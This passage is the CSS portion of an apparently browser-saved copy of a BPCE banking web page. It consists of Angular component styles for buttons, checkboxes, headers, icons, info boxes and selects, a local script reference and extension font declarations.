      .bpce-button-quaternary[_nghost-ng-c2770057049]:before {
        content: "";
        background-color: #000;
        position: absolute;
        left: 0;
        width: 100%;
        top: 0;
        height: 100%;
        z-index: 1;
        opacity: 0;
        border-radius: 4px;
        transition: opacity 0.25s ease;
      }
      @media (hover: hover) and (pointer: fine) {
        .bpce-button-primary[_nghost-ng-c2770057049]:hover:before {
          opacity: 0.2;
        }
      }
      .bpce-button-primary[_nghost-ng-c2770057049]:active:before {
        opacity: 0.4;
      }
      @media (hover: hover) and (pointer: fine) {
        .bpce-button-secondary[_nghost-ng-c2770057049]:hover:before,
        .bpce-button-tertiary[_nghost-ng-c2770057049]:hover:before,
        .bpce-button-quaternary[_nghost-ng-c2770057049]:hover:before {
          opacity: 0.08;
        }
      }
      .bpce-button-secondary[_nghost-ng-c2770057049]:active:before,
      .bpce-button-tertiary[_nghost-ng-c2770057049]:active:before,
      .bpce-button-quaternary[_nghost-ng-c2770057049]:active:before {
        opacity: 0.2;
      }
      .bpce-button[_nghost-ng-c2770057049]:disabled,
      .bpce-button-disabled[_nghost-ng-c2770057049] {
        color: #999 !important;
        background: #f5f5f5 !important;
        border-color: #f5f5f5 !important;
        cursor: not-allowed !important;
      }
      @media (hover: hover) and (pointer: fine) {
        .bpce-button[_nghost-ng-c2770057049]:disabled:hover,
        .bpce-button-disabled[_nghost-ng-c2770057049]:hover {
          text-decoration: none !important;
        }
      }
      .bpce-button[_nghost-ng-c2770057049]:disabled:before,
      .bpce-button-disabled[_nghost-ng-c2770057049]:before {
        display: none;
      }
      .bpce-button-icon-only[_nghost-ng-c2770057049] {
        padding: 7px;
      }
      .bpce-button-icon-only[_nghost-ng-c2770057049]
        > span[_ngcontent-ng-c2770057049]
        + ui-icon-v2[_ngcontent-ng-c2770057049] {
        margin-left: 0;
      }
      .bpce-button-loading[_nghost-ng-c2770057049] {
        pointer-events: none;
      }
      .bpce-button-loading[_nghost-ng-c2770057049]:before {
        content: none;
      }
      .bpce-button-loading[_nghost-ng-c2770057049]
        > *[_ngcontent-ng-c2770057049]:not(ui-loader-core) {
        color: transparent;
        visibility: hidden;
      }
      .bpce-button-loading[_nghost-ng-c2770057049]
        > ui-loader-core[_ngcontent-ng-c2770057049] {
        position: absolute;
      }
      .bpce-button-loading[_nghost-ng-c2770057049]
        > ui-loader-core[_ngcontent-ng-c2770057049]
        svg
        circle {
        stroke: currentColor;
      }
      .bpce-button-inline[_nghost-ng-c2770057049] {
        flex: 0 1 auto;
      }
      .bpce-button-flex[_nghost-ng-c2770057049] {
        flex: 1 1 0%;
      }
      .bpce-button-block[_nghost-ng-c2770057049] {
        flex: 1 1 100%;
      }
      .bpce-button-colored[_nghost-ng-c2770057049] {
        --button-core-primary: inherit;
      }
      .bpce-button-colored.bpce-button-primary[_nghost-ng-c2770057049] {
        background-color: var(--button-core-primary);
        border-color: var(--button-core-primary);
      }
      .bpce-button-colored.bpce-button-secondary[_nghost-ng-c2770057049] {
        color: var(--button-core-primary);
        border-color: var(--button-core-primary);
      }
      .bpce-button-colored.bpce-button-tertiary[_nghost-ng-c2770057049] {
        color: var(--button-core-primary);
      }
      @media (min-width: 960px) {
        .bpce-button-colored.bpce-button-no-mobile-border[_nghost-ng-c2770057049] {
          border-color: var(--button-core-primary);
        }
      }
      .bpce-button-colored.bpce-button-no-border[_nghost-ng-c2770057049] {
        border-color: transparent;
      }
    </style>
    <style>
      .loading[_ngcontent-ng-c2496744845] {
        display: flex;
        justify-content: center;
      }
    </style>
    <style>
      @keyframes _ngcontent-ng-c616431058_shimmering {
        0% {
          transform: translate3d(-100%, 0, 0);
        }
        to {
          transform: translate3d(75%, 0, 0);
        }
      }
      .bpce-checkbox-input[_ngcontent-ng-c616431058] {
        border: 0;
        clip: rect(0 0 0 0);
        height: 1px;
        margin: -1px;
        overflow: hidden;
        padding: 0;
        position: absolute;
        width: 1px;
        outline: 0;
        -webkit-appearance: none;
        -moz-appearance: none;
        appearance: none;
      }
      [_nghost-ng-c616431058] {
        font: 400 1rem/1.375rem Ubuntu, Arial, sans-serif;
        letter-spacing: -0.14px;
      }
      @media (min-width: 960px) {
        [_nghost-ng-c616431058] {
          letter-spacing: 0;
        }
      }
      [_nghost-ng-c616431058] {
        display: inline-block;
        margin: 0 40px 8px 0;
        position: relative;
      }
      .bpce-checkbox-label[_ngcontent-ng-c616431058] {
        display: flex;
        cursor: pointer;
        color: #333;
        min-height: 22px;
      }
      .bpce-checkbox-square[_ngcontent-ng-c616431058] {
        position: relative;
        flex: 0 0 auto;
        box-sizing: border-box;
        width: 16px;
        height: 16px;
        border: 2px solid #666666;
        border-radius: 3px;
        margin-top: 3px;
        margin-right: 8px;
        transition: background-color 0.25s ease;
        text-align: justify;
      }
      .bpce-checkbox-icon[_ngcontent-ng-c616431058] {
        position: absolute;
        visibility: hidden;
      }
      .bpce-checkbox-icon[_ngcontent-ng-c616431058]
        path[_ngcontent-ng-c616431058] {
        stroke: #fff;
        stroke-width: 3px;
        stroke-linecap: round;
        stroke-linejoin: round;
        stroke-dasharray: 31.1127;
        stroke-dashoffset: 31.1127;
        transition: stroke-dashoffset 0.25s ease 50ms;
      }
      .bpce-checkbox-icon-indeterminate[_ngcontent-ng-c616431058] {
        transform: scale3d(0, 0, 0);
        transform-origin: 50%;
        transition: transform 0.25s ease 50ms;
      }
      .bpce-checkbox-icon-indeterminate[_ngcontent-ng-c616431058]
        line[_ngcontent-ng-c616431058] {
        stroke-width: 5px;
        stroke-linecap: round;
      }
      .bpce-checkbox-input[_ngcontent-ng-c616431058]:focus
        + .bpce-checkbox-label[_ngcontent-ng-c616431058]
        .bpce-checkbox-square[_ngcontent-ng-c616431058] {
        box-shadow: 0 0 2px 3px #6ba1f8;
      }
      .bpce-checkbox-input[_ngcontent-ng-c616431058]:checked
        + .bpce-checkbox-label[_ngcontent-ng-c616431058]
        .bpce-checkbox-icon[_ngcontent-ng-c616431058] {
        visibility: visible;
      }
      .bpce-checkbox-input[_ngcontent-ng-c616431058]:checked
        + .bpce-checkbox-label[_ngcontent-ng-c616431058]
        .bpce-checkbox-icon[_ngcontent-ng-c616431058]
        path[_ngcontent-ng-c616431058] {
        stroke-dashoffset: 0;
      }
      .bpce-checkbox-input[_ngcontent-ng-c616431058]:checked
        + .bpce-checkbox-label[_ngcontent-ng-c616431058]
        .bpce-checkbox-icon-indeterminate[_ngcontent-ng-c616431058] {
        visibility: hidden;
      }
      .bpce-checkbox-input[_ngcontent-ng-c616431058]:indeterminate
        + .bpce-checkbox-label[_ngcontent-ng-c616431058]
        .bpce-checkbox-icon[_ngcontent-ng-c616431058] {
        visibility: hidden;
      }
      .bpce-checkbox-input[_ngcontent-ng-c616431058]:indeterminate
        + .bpce-checkbox-label[_ngcontent-ng-c616431058]
        .bpce-checkbox-icon-indeterminate[_ngcontent-ng-c616431058] {
        visibility: visible;
        transform: scaleZ(1);
      }
      .bpce-checkbox-input[_ngcontent-ng-c616431058]:indeterminate
        + .bpce-checkbox-label[_ngcontent-ng-c616431058]
        .bpce-checkbox-square[_ngcontent-ng-c616431058] {
        background-color: transparent;
      }
      .bpce-checkbox-input[_ngcontent-ng-c616431058]:disabled
        + .bpce-checkbox-label[_ngcontent-ng-c616431058] {
        color: #999;
        cursor: default;
        cursor: not-allowed;
      }
      .bpce-checkbox-input[_ngcontent-ng-c616431058]:disabled
        + .bpce-checkbox-label[_ngcontent-ng-c616431058]
        .bpce-checkbox-square[_ngcontent-ng-c616431058] {
        border-color: #999;
        border-width: 2px;
        background-color: #f5f5f5;
      }
      .bpce-checkbox-input[_ngcontent-ng-c616431058]:disabled
        + .bpce-checkbox-label[_ngcontent-ng-c616431058]
        .bpce-checkbox-icon[_ngcontent-ng-c616431058]
        path[_ngcontent-ng-c616431058],
      .bpce-checkbox-input[_ngcontent-ng-c616431058]:disabled
        + .bpce-checkbox-label[_ngcontent-ng-c616431058]
        .bpce-checkbox-icon[_ngcontent-ng-c616431058]
        line[_ngcontent-ng-c616431058] {
        stroke: #999;
      }
    </style>
    <style>
      .bpce-header-ellipsis-container[_ngcontent-ng-c1469276399],
      .bpce-header-ellipsis-container[_ngcontent-ng-c1469276399]
        > :first-child {
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap;
      }
      @keyframes _ngcontent-ng-c1469276399_shimmering {
        0% {
          transform: translate3d(-100%, 0, 0);
        }
        to {
          transform: translate3d(75%, 0, 0);
        }
      }
      .bpce-header-ellipsis-container[_ngcontent-ng-c1469276399],
      .bpce-header-ellipsis-container[_ngcontent-ng-c1469276399]
        > :first-child {
        font: 400 1rem/1.375rem Ubuntu, Arial, sans-serif;
        letter-spacing: -0.14px;
      }
      @media (min-width: 960px) {
        .bpce-header-ellipsis-container[_ngcontent-ng-c1469276399],
        .bpce-header-ellipsis-container[_ngcontent-ng-c1469276399]
          > :first-child {
          letter-spacing: 0;
        }
      }
      [_nghost-ng-c1469276399] {
        display: block;
      }
      .bpce-header[_ngcontent-ng-c1469276399] {
        display: flex;
        justify-content: space-between;
        padding: 0 8px;
        height: 56px;
      }
      @media (min-width: 960px) {
        .bpce-header[_ngcontent-ng-c1469276399] {
          padding: 0 16px;
          height: 64px;
        }
      }
      .bpce-header-left[_ngcontent-ng-c1469276399],
      .bpce-header-middle[_ngcontent-ng-c1469276399],
      .bpce-header-right[_ngcontent-ng-c1469276399] {
        display: flex;
        align-items: center;
      }
      .bpce-header-left[_ngcontent-ng-c1469276399] {
        min-width: 32px;
        flex: 0 0 auto;
        justify-content: flex-start;
      }
      .bpce-header-right[_ngcontent-ng-c1469276399] {
        min-width: 32px;
        justify-content: flex-end;
        flex: 0 0 auto;
      }
      .bpce-header-middle[_ngcontent-ng-c1469276399] {
        min-width: 0;
        justify-content: center;
        margin: 0 16px;
      }
      @media (min-width: 960px) {
        .bpce-header-middle[_ngcontent-ng-c1469276399] {
          margin: 0 24px;
        }
      }
      .bpce-header-only-title[_ngcontent-ng-c1469276399]
        .bpce-header-left[_ngcontent-ng-c1469276399],
      .bpce-header-only-title[_ngcontent-ng-c1469276399]
        .bpce-header-right[_ngcontent-ng-c1469276399] {
        min-width: 0;
      }
      .bpce-header-ellipsis-container[_ngcontent-ng-c1469276399],
      .bpce-header-ellipsis-container[_ngcontent-ng-c1469276399]
        > :first-child {
        color: inherit;
        text-align: center;
      }
      .bpce-header-ellipsis-container[_ngcontent-ng-c1469276399]:empty {
        display: none;
      }
      .bpce-header-logo[_ngcontent-ng-c1469276399] {
        width: auto;
        height: 32px;
        background-repeat: no-repeat;
        background-position: 50% 50%;
        background-size: contain;
      }
      .bpce-header[_ngcontent-ng-c1469276399]:not(
          .bpce-header-with-custom-background
        )
        .bpce-header-middle[_ngcontent-ng-c1469276399] {
        color: #333;
      }
      .bpce-header-with-border-bottom[_ngcontent-ng-c1469276399] {
        border-bottom: 1px solid #cccccc;
      }
      .bpce-header-with-background[_ngcontent-ng-c1469276399] {
        background: #ffffff;
      }
      .bpce-header-with-custom-background[_ngcontent-ng-c1469276399]
        > .bpce-header-middle[_ngcontent-ng-c1469276399] {
        color: #fff;
      }
      .bpce-header-with-shadow[_ngcontent-ng-c1469276399] {
        box-shadow: 0 6px 10px -10px #0000008c;
      }
    </style>
    <style>
      [_nghost-ng-c962536600] {
        display: inline-block;
        line-height: 0;
      }
      .ui-icon[_ngcontent-ng-c962536600] {
        line-height: 0;
        color: inherit;
      }
      .ui-icon[_ngcontent-ng-c962536600]:before {
        display: flex;
        align-items: center;
      }
      .ui-icon-sm[_ngcontent-ng-c962536600] {
        font-size: 16px;
      }
      .ui-icon-sm[_ngcontent-ng-c962536600]:before {
        height: 16px;
      }
      .ui-icon-md[_ngcontent-ng-c962536600] {
        font-size: 24px;
      }
      .ui-icon-md[_ngcontent-ng-c962536600]:before {
        height: 24px;
      }
      .ui-icon-lg[_ngcontent-ng-c962536600] {
        font-size: 32px;
      }
      .ui-icon-lg[_ngcontent-ng-c962536600]:before {
        height: 32px;
      }
      .ui-icon-xl[_ngcontent-ng-c962536600] {
        font-size: 40px;
      }
      .ui-icon-xl[_ngcontent-ng-c962536600]:before {
        height: 40px;
      }
      .ui-icon-xxl[_ngcontent-ng-c962536600] {
        font-size: 48px;
      }
      .ui-icon-xxl[_ngcontent-ng-c962536600]:before {
        height: 48px;
      }
      .ui-icon-xxxl[_ngcontent-ng-c962536600] {
        font-size: 56px;
      }
      .ui-icon-xxxl[_ngcontent-ng-c962536600]:before {
        height: 56px;
      }
    </style>
    <style>
      @keyframes _ngcontent-ng-c3316464542_shimmering {
        0% {
          transform: translate3d(-100%, 0, 0);
        }
        to {
          transform: translate3d(75%, 0, 0);
        }
      }
      .right-column[_ngcontent-ng-c3316464542] {
        height: 100%;
        padding: 0 48px;
        background-repeat: no-repeat;
        background-size: cover;
        background-position: center;
        background-color: #666;
        overflow: hidden;
        position: relative;
      }
      .right-column[_ngcontent-ng-c3316464542]
        .common-info[_ngcontent-ng-c3316464542] {
        padding-top: 40px;
        display: flex;
        -moz-flex-direction: column;
        flex-direction: column;
        align-items: center;
        color: #fff;
        text-transform: uppercase;
        height: 120px;
      }
      .right-column[_ngcontent-ng-c3316464542]
        .common-info[_ngcontent-ng-c3316464542]
        img[_ngcontent-ng-c3316464542] {
        width: 48px;
        margin: 16px;
      }
      .right-column[_ngcontent-ng-c3316464542]
        .common-info[_ngcontent-ng-c3316464542]
        span[_ngcontent-ng-c3316464542],
      .right-column[_ngcontent-ng-c3316464542]
        .common-info[_ngcontent-ng-c3316464542]
        h1[_ngcontent-ng-c3316464542] {
        text-align: center;
        font-weight: 500;
        font-size: 21px;
        line-height: 32px;
      }
      .right-column[_ngcontent-ng-c3316464542]
        .overlay-background[_ngcontent-ng-c3316464542] {
        position: absolute;
        bottom: 0;
        right: 0;
      }
      .right-column[_ngcontent-ng-c3316464542]
        as-maintenance-informative-message[_ngcontent-ng-c3316464542] {
        max-width: 588px;
        margin: 24px auto 0;
        display: block;
        position: relative;
      }
    </style>
    <style>
      .c-header {
        flex-direction: column;
        width: var(--t-header-inner-width);
        height: auto;
        padding: 0;
        box-shadow: var(--t-header-shadow);
        display: flex;
        box-sizing: border-box;
      }
    </style>
    <style>
      @keyframes _ngcontent-ng-c484427599_shimmering {
        0% {
          transform: translate3d(-100%, 0, 0);
        }
        to {
          transform: translate3d(75%, 0, 0);
        }
      }
      [_nghost-ng-c484427599] {
        background: rgba(255, 255, 255, 0.75);
        border-radius: 4px;
        color: #333;
      }
      div.more-info[_ngcontent-ng-c484427599] {
        text-align: center;
        margin-top: 16px;
      }
      div.more-info[_ngcontent-ng-c484427599] a[_ngcontent-ng-c484427599] {
        color: #051b71;
        font-weight: 400;
        font-size: 13px;
        line-height: 18px;
        text-decoration: none;
      }
      [_nghost-ng-c484427599]
        .no-border[_ngcontent-ng-c484427599]
        .bpce-infobox {
        border: none;
      }
      [_nghost-ng-c484427599] .bpce-infobox .no-border {
        border: none;
      }
      [_nghost-ng-c484427599] .bpce-infobox .bpce-infobox-title {
        color: #333;
      }
      @media (max-width: 599px) {
        [_nghost-ng-c484427599] .bpce-infobox {
          margin-top: 48px;
        }
      }
      [_nghost-ng-c484427599] .bpce-infobox ui-icon-v2 {
        color: #051b71;
      }
      [_nghost-ng-c484427599] .message {
        font-weight: 400;
        font-size: 13px;
        line-height: 18px;
        color: #333;
        max-height: 200px;
        overflow: auto;
      }
      @media (max-width: 959px) {
        [_nghost-ng-c484427599] .message {
          max-height: auto;
        }
      }
    </style>
    <style>
      @keyframes _ngcontent-ng-c4053859946_shimmering {
        0% {
          transform: translate3d(-100%, 0, 0);
        }
        to {
          transform: translate3d(75%, 0, 0);
        }
      }
      .bpce-infobox-content[_ngcontent-ng-c4053859946] {
        font: 400 1rem/1.375rem Ubuntu, Arial, sans-serif;
        letter-spacing: -0.14px;
      }
      @media (min-width: 960px) {
        .bpce-infobox-content[_ngcontent-ng-c4053859946] {
          letter-spacing: 0;
        }
      }
      .bpce-infobox-title[_ngcontent-ng-c4053859946] {
        font: 700 1rem/1.375rem Ubuntu, Arial, sans-serif;
        letter-spacing: -0.2px;
      }
      @media (min-width: 960px) {
        .bpce-infobox-title[_ngcontent-ng-c4053859946] {
          letter-spacing: 0;
        }
      }
      [_nghost-ng-c4053859946] {
        display: block;
      }
      .bpce-infobox[_ngcontent-ng-c4053859946] {
        padding: 16px;
        border-radius: 4px;
      }
      .bpce-infobox-header[_ngcontent-ng-c4053859946] {
        display: flex;
        align-items: center;
        margin-bottom: 8px;
      }
      .bpce-infobox-icon[_ngcontent-ng-c4053859946] {
        font-size: 24px;
        flex: 0 0 auto;
      }
      .bpce-infobox-title[_ngcontent-ng-c4053859946] {
        margin: 0 0 0 8px !important;
      }
      .bpce-infobox-ellipsis[_ngcontent-ng-c4053859946]
        .bpce-infobox-title[_ngcontent-ng-c4053859946] {
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
      }
      .bpce-infobox-content[_ngcontent-ng-c4053859946] {
        margin: 0;
      }
      .bpce-infobox-content[_ngcontent-ng-c4053859946]
        a[_ngcontent-ng-c4053859946] {
        color: inherit;
        text-decoration: underline;
        text-underline-position: under;
      }
      .bpce-infobox-action[_ngcontent-ng-c4053859946] {
        margin-top: 8px;
        width: 100%;
        max-width: none;
      }
      .bpce-infobox-secondary[_ngcontent-ng-c4053859946] {
        color: #666;
        border-color: #666;
        background-color: #f9f9fb;
      }
      .bpce-infobox-secondary[_ngcontent-ng-c4053859946]
        .bpce-infobox-icon[_ngcontent-ng-c4053859946] {
        color: inherit;
      }
      .bpce-infobox-warning[_ngcontent-ng-c4053859946] {
        border-color: #fa5c00;
        color: #fa5c00;
      }
      .bpce-infobox-warning[_ngcontent-ng-c4053859946]
        .bpce-infobox-icon[_ngcontent-ng-c4053859946] {
        color: inherit;
      }
      .bpce-infobox-error[_ngcontent-ng-c4053859946] {
        border-color: #e91b06;
        color: #e91b06;
      }
      .bpce-infobox-error[_ngcontent-ng-c4053859946]
        .bpce-infobox-icon[_ngcontent-ng-c4053859946] {
        color: inherit;
      }
    </style>
    <style>
      @keyframes _ngcontent-ng-c3602483024_shimmering {
        0% {
          transform: translate3d(-100%, 0, 0);
        }
        to {
          transform: translate3d(75%, 0, 0);
        }
      }
      p[_ngcontent-ng-c3602483024] {
        padding: 24px 0;
        text-align: center;
      }
    </style>
    <style>
      @keyframes _ngcontent-ng-c61799814_shimmering {
        0% {
          transform: translate3d(-100%, 0, 0);
        }
        to {
          transform: translate3d(75%, 0, 0);
        }
      }
      @media (min-width: 960px) {
        .bpce-select-v2[_ngcontent-ng-c61799814]
          > select[_ngcontent-ng-c61799814],
        .bpce-select-v2[_ngcontent-ng-c61799814]
          > label[_ngcontent-ng-c61799814] {
          letter-spacing: 0;
        }
      }
      select {
        margin-bottom: 0.75em;
        width: 100%;
        border-radius: 10px;
        height: 37px;
        font-size: 14px;
      }
      .bpce-select-v2-error-msg[_ngcontent-ng-c61799814] {
        font: 400 0.8125rem/1.125rem Ubuntu, Arial, sans-serif;
        letter-spacing: 0;
      }
      [_nghost-ng-c61799814] {
        display: block;
      }
      .bpce-select-v2[_ngcontent-ng-c61799814] {
        position: relative;
      }
      .bpce-select-v2[_ngcontent-ng-c61799814]
        > label[_ngcontent-ng-c61799814] {
        color: #666;
        position: absolute;
        top: 16px;
        padding: 0;
        transform-origin: 0 0;
        transform: translate3d(8px, -7px, 0) scale(0.8125);
        transition: transform 0.25s ease, color 0.25s ease;
        pointer-events: none;
      }
      .bpce-select-v2[_ngcontent-ng-c61799814]
        > label.bpce-select-v2-empty[_ngcontent-ng-c61799814] {
        color: #333;
        transform: translate3d(8px, 0, 0) scale(1);
      }
      @media all and (-ms-high-contrast: none), (-ms-high-contrast: active) {
        .bpce-select-v2[_ngcontent-ng-c61799814]
          > label.bpce-select-v2-empty[_ngcontent-ng-c61799814] {
          color: #666;
          transform: translate3d(8px, -7px, 0) scale(0.8125);
        }
      }
      .bpce-select-v2[_ngcontent-ng-c61799814]
        > select[_ngcontent-ng-c61799814] {
        color: #333;
        background-color: #f9f9fb;
        display: block;
        width: 100%;
        padding: 26px 40px 5px 8px;
        margin: 0;
        border: 1px solid transparent;
        border-bottom: 2px solid #666666;
        border-radius: 4px 4px 0 0;
        transition: border-color 0.35s ease;
        -webkit-appearance: none;
      }
      @media (hover: hover) and (pointer: fine) {
        .bpce-select-v2[_ngcontent-ng-c61799814]
          > select[_ngcontent-ng-c61799814]:hover {
          border-color: #666;
        }
      }
      .bpce-select-v2[_ngcontent-ng-c61799814]
        > select[_ngcontent-ng-c61799814]:focus {
        outline: none;
        border-color: #333;
      }
      .bpce-select-v2[_ngcontent-ng-c61799814]
        > select[_ngcontent-ng-c61799814]:disabled {
        background-color: #f5f5f5;
        border-color: transparent;
        color: #999;
        cursor: not-allowed;
      }
      .bpce-select-v2[_ngcontent-ng-c61799814]
        > select[_ngcontent-ng-c61799814]::-ms-expand {
        display: none;
      }
      .bpce-select-v2-icon[_ngcontent-ng-c61799814] {
        position: absolute;
        right: 0;
        top: 0;
        margin: 16px 8px;
        z-index: 1;
        pointer-events: none;
        fill: #333;
        transform: rotate(0);
        transition: all 0.35s ease;
      }
      .bpce-select-v2-icon-inverted[_ngcontent-ng-c61799814] {
        transform: rotate(-180deg);
      }
      .bpce-select-v2-error-msg[_ngcontent-ng-c61799814],
      .bpce-select-v2-custom-msg[_ngcontent-ng-c61799814] {
        margin: 0;
        padding: 0;
        opacity: 0;
        visibility: hidden;
        max-height: 0;
        transition: opacity 0.35s ease, max-height 0.35s ease, margin 0.35s ease,
          visibility 0.35s ease;
      }
      .bpce-select-v2-error-msg[_ngcontent-ng-c61799814] {
        display: block;
        color: #e91b06;
      }
      .bpce-select-v2-error[_ngcontent-ng-c61799814]
        > label[_ngcontent-ng-c61799814],
      .bpce-select-v2-error[_ngcontent-ng-c61799814]
        > label.bpce-select-v2-empty[_ngcontent-ng-c61799814] {
        color: #e91b06;
      }
      .bpce-select-v2-error[_ngcontent-ng-c61799814]
        select[_ngcontent-ng-c61799814] {
        border-color: #e91b06;
      }
      .bpce-select-v2-error[_ngcontent-ng-c61799814]
        ~ .bpce-select-v2-error-msg[_ngcontent-ng-c61799814] {
        opacity: 1;
        max-height: 56px;
        margin-top: 8px;
        visibility: visible;
      }
      .bpce-select-v2[_ngcontent-ng-c61799814]
        select[_ngcontent-ng-c61799814]:focus
        ~ label[_ngcontent-ng-c61799814],
      .bpce-select-v2[_ngcontent-ng-c61799814]
        select[_ngcontent-ng-c61799814]:focus
        ~ label.bpce-select-v2-empty[_ngcontent-ng-c61799814] {
        color: #666;
        transform: translate3d(8px, -7px, 0) scale(0.8125);
      }
      @media all and (-ms-high-contrast: none), (-ms-high-contrast: active) {
        .bpce-select-v2[_ngcontent-ng-c61799814]
          select[_ngcontent-ng-c61799814]:focus
          ~ label[_ngcontent-ng-c61799814],
        .bpce-select-v2[_ngcontent-ng-c61799814]
          select[_ngcontent-ng-c61799814]:focus
          ~ label.bpce-select-v2-empty[_ngcontent-ng-c61799814] {
          color: #666;
          transform: translate3d(8px, -7px, 0) scale(0.8125);
        }
      }
      .bpce-select-v2-message-info[_ngcontent-ng-c61799814]
        > label[_ngcontent-ng-c61799814] {
        color: #666;
      }
      .bpce-select-v2-message-info[_ngcontent-ng-c61799814]
        > select[_ngcontent-ng-c61799814] {
        border-color: #666;
      }
      .bpce-select-v2-message-error[_ngcontent-ng-c61799814]
        > label[_ngcontent-ng-c61799814] {
        color: #e91b06;
      }
      .bpce-select-v2-message-error[_ngcontent-ng-c61799814]
        > select[_ngcontent-ng-c61799814] {
        border-color: #e91b06;
      }
      .bpce-select-v2-message-success[_ngcontent-ng-c61799814]
        > label[_ngcontent-ng-c61799814] {
        color: #398538;
      }
      .bpce-select-v2-message-success[_ngcontent-ng-c61799814]
        > select[_ngcontent-ng-c61799814] {
        border-color: #398538;
      }
      .bpce-select-v2-message-warning[_ngcontent-ng-c61799814]
        > label[_ngcontent-ng-c61799814] {
        color: #fa5c00;
      }
      .bpce-select-v2-message-warning[_ngcontent-ng-c61799814]
        > select[_ngcontent-ng-c61799814] {
        border-color: #fa5c00;
      }
      .bpce-select-v2-message-info[_ngcontent-ng-c61799814]:not(
          .bpce-select-v2-disabled
        )
        ~ .bpce-select-v2-custom-msg[_ngcontent-ng-c61799814],
      .bpce-select-v2-message-error[_ngcontent-ng-c61799814]:not(
          .bpce-select-v2-disabled
        )
        ~ .bpce-select-v2-custom-msg[_ngcontent-ng-c61799814],
      .bpce-select-v2-message-success[_ngcontent-ng-c61799814]:not(
          .bpce-select-v2-disabled
        )
        ~ .bpce-select-v2-custom-msg[_ngcontent-ng-c61799814],
      .bpce-select-v2-message-warning[_ngcontent-ng-c61799814]:not(
          .bpce-select-v2-disabled
        )
        ~ .bpce-select-v2-custom-msg[_ngcontent-ng-c61799814] {
        opacity: 1;
        max-height: 56px;
        margin-top: 8px;
        visibility: visible;
      }
      .bpce-select-v2-disabled[_ngcontent-ng-c61799814]
        label[_ngcontent-ng-c61799814],
      .bpce-select-v2-disabled[_ngcontent-ng-c61799814]
        label.bpce-select-v2-empty[_ngcontent-ng-c61799814] {
        color: #999;
      }
      .bpce-select-v2-disabled[_ngcontent-ng-c61799814]
        select[_ngcontent-ng-c61799814] {
        opacity: 1;
      }
      .bpce-select-v2-disabled-icon[_ngcontent-ng-c61799814] {
        fill: #999;
      }
    </style>
    <style>
      @font-face {
        font-family: "NotoSans_online_security";
        src: url(chrome-extension://llbcnfanfmjhpedaedhbcnpgeepdnnok/assets/fonts/noto-sans-regular.woff);
      }

      @font-face {
        font-family: "NotoSans_medium_online_security";
        src: url(chrome-extension://llbcnfanfmjhpedaedhbcnpgeepdnnok/assets/fonts/noto-sans-medium.ttf);
      }

      @font-face {
        font-family: "NotoSans_bold_online_security";
        src: url(chrome-extension://llbcnfanfmjhpedaedhbcnpgeepdnnok/assets/fonts/noto-sans-bold.woff);
      }

      @font-face {
        font-family: "NotoSans_semibold_online_security";
        src: url(chrome-extension://llbcnfanfmjhpedaedhbcnpgeepdnnok/assets/fonts/noto-sans-semibold.ttf);
      }
    </style>
    <style data-styled="active" data-styled-version="5.2.3"></style>

    <script
      id="tmx_tags_js"
      type="text/javascript"
      src="./index_files/imp95sy7312kt8r7.js.téléchargement"
    ></script>

    <style>
      @font-face {
        font-family: "NotoSans_online_security";
        src: url(chrome-extension://llbcnfanfmjhpedaedhbcnpgeepdnnok/assets/fonts/noto-sans-regular.woff);
      }

      @font-face {
        font-family: "NotoSans_medium_online_security";
        src: url(chrome-extension://llbcnfanfmjhpedaedhbcnpgeepdnnok/assets/fonts/noto-sans-medium.ttf);
      }

      @font-face {
        font-family: "NotoSans_bold_online_security";
        src: url(chrome-extension://llbcnfanfmjhpedaedhbcnpgeepdnnok/assets/fonts/noto-sans-bold.woff);
      }

      @font-face {
        font-family: "NotoSans_semibold_online_security";
        src: url(chrome-extension://llbcnfanfmjhpedaedhbcnpgeepdnnok/assets/fonts/noto-sans-semibold.ttf);
      }
    </style>
    <style>
      ._2iCCN {
        cursor: pointer;
        margin-top: 0;
        min-height: 3rem;
        padding-left: 2px;
        position: relative;
        z-index: 1;
      }

      ._2iCCN ._1iJKV {
        color: #1a1a1a;
        font-size: 1.4rem;
        margin-left: 0.8rem;
        margin-right: 1.6rem;
        width: 100%;
      }

      ._2iCCN._1PeFO {
        -ms-flex-align: center;
        -webkit-align-items: center;
        align-items: center;
      }

      ._2iCCN._4W9Aq {
        -ms-flex-align: end;
        -webkit-align-items: flex-end;
        align-items: flex-end;
      }

      ._2iCCN ._1T1yE {
        border-radius: 4px;
        -webkit-box-sizing: border-box;
        box-sizing: border-box;
        height: 2rem;
        min-width: 2rem;
        position: relative;
        -webkit-transition: -webkit-box-shadow 0.4s;
        transition: -webkit-box-shadow 0.4s;
        -o-transition: box-shadow 0.4s;
        transition: box-shadow 0.4s;
        transition: box-shadow 0.4s, -webkit-box-shadow 0.4s;
        width: 2rem;
        z-index: 2;
      }
      #blockFraudWarning p strong.url {
        display: inline-block;
        position: relative;
        background: rgba(0, 0, 143, 0.04);
        padding: 2px 8px 2px 24px;
        border-radius: 8px;
        color: #333333;
      }
      ._2iCCN._24Hlc {
        -ms-flex-align: start;
        -webkit-align-items: flex-start;
        align-items: flex-start;
      }

      ._2iCCN ._3_iNE {
        border-color: #fff;
        border-radius: 4px;
        cursor: pointer;
        height: 2rem;
        margin: 0;
        opacity: 0;
        position: absolute;
        width: 2rem;
      }

      ._2iCCN ._3_iNE:checked ~ ._1T1yE:after {
        border: solid #fff;
        border-width: 0 2px 2px 0;
        -webkit-box-sizing: content-box;
        box-sizing: content-box;
        content: "";
        height: 1.2rem;
        left: 0.6rem;
        position: absolute;
        top: 0.1rem;
        -webkit-transform: rotate(45deg);
        -ms-transform: rotate(45deg);
        transform: rotate(45deg);
        width: 0.5rem;
      }

      ._2iCCN ._3_iNE:disabled ~ ._1T1yE {
        border: 2px solid #cad1d9;
      }

      ._2iCCN ._3_iNE:focus ~ ._1T1yE {
        -webkit-box-shadow: 0 0 0 2px #1a1a1a;
        box-shadow: 0 0 0 2px #1a1a1a;
      }

      ._2iCCN ._3_iNE:not(:checked):not(:disabled) ~ ._1T1yE {
        border: 2px solid #a8b4c0;
      }

      ._2iCCN ._3_iNE._2swUR:checked ~ ._1T1yE {
        background-color: #4183d7;
      }

      ._2iCCN ._3_iNE.uHr-l:checked ~ ._1T1yE {
        background-color: #ff6e14;
      }

      ._2iCCN ._3_iNE._1vjBG:checked ~ ._1T1yE {
        background-color: #db4437;
      }

      ._2iCCN ._3_iNE._1T2tO:checked ~ ._1T1yE {
        background-color: #55b950;
      }

